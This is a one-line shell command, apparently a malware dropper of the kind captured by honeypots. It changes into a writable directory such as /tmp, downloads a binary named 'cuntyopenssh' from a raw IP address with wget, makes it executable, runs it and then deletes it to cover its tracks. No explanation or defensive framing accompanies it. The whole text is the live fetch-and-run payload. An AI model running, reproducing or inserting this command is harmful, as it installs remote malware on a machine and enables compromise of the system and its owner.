cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.56.81/cuntyopenssh; chmod +x cuntyopenssh; ./cuntyopenssh; rm -rf cuntyopenssh
